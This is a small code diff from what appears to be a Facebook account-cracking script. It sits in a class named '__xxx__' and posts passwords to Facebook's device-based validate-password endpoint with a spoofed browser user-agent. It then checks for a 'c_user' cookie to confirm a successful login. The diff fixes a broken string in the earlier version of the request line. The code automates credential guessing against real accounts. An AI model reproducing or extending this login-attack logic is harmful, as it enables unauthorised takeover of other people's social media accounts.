@@ -371,7 +371,7 @@ class __xxx__:
                     'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0',
                 }
 
-                po = session.post(m.facebook.com/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
+                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
 
                 if 'c_user' in session.cookies.get_dict():
 
